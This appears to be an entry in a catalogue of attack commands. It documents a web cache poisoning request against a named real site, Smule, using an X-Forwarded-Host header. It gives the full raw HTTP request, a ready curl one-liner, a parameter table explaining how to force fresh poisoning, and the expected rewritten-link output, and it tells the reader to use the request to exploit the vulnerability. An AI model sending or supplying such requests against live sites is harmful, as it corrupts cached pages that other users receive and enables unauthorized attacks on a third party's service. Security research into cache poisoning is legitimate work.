---
id: cmd-smule-modify-get-001
name: modify-get-with-x-forwarded-host
type: command
executor: http
data: >-
  GET /s/smule_groups/user_groups/fossnow27 HTTP/1.1\nHost:
  www.smule.com\nX-Forwarded-Host: localhost\nUser-Agent: Mozilla/5.0 (X11;
  Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept:
  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language:
  en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nCookie: [redacted
  cookies]\nConnection: close\nUpgrade-Insecure-Requests: 1\nIf-None-Match:
  W/\"74107fb6dcc410390f339e5ddabc3022\"\nCache-Control: max-age=0
output: null
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:50.329Z'
platforms:
  - Web
tags:
  - web-cache-poisoning
verified: false
validated: true
submitted: true
---

# modify-get-with-x-forwarded-host

## Command

```http
GET /s/smule_groups/user_groups/fossnow27 HTTP/1.1
Host: www.smule.com
X-Forwarded-Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: [redacted cookies]
Connection: close
Upgrade-Insecure-Requests: 1
If-None-Match: W/"74107fb6dcc410390f339e5ddabc3022"
Cache-Control: max-age=0
```

## Description

This HTTP request modifies a standard GET to Smule's user group page by adding the X-Forwarded-Host header set to 'localhost', poisoning the web cache with rewritten URLs. Use in a proxy like Burp Suite to exploit the vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| X-Forwarded-Host | Forces server to rewrite URLs to specified host (e.g., localhost) | Yes |
| Host | Original target domain | Yes |
| Cookie | Session cookies if authenticated | No |
| Cache-Control | Bypasses cache to force fresh poison | No |

## Examples

### Basic Usage

Send via curl equivalent:
```bash
curl -X GET "https://www.smule.com/s/smule_groups/user_groups/fossnow27" -H "X-Forwarded-Host: localhost" -H "Cache-Control: max-age=0"
```

### Advanced Usage

With full headers in Burp or netcat:
```bash
# As shown in command block above
```

## Expected Output

HTTP 200 OK with HTML body where internal links (e.g., <a href="/user/check_email">) are rewritten to <a href="http://localhost/user/check_email">.

## Related

- [[Related Procedure: Poison-Web-Cache-with-X-Forwarded-Host]]
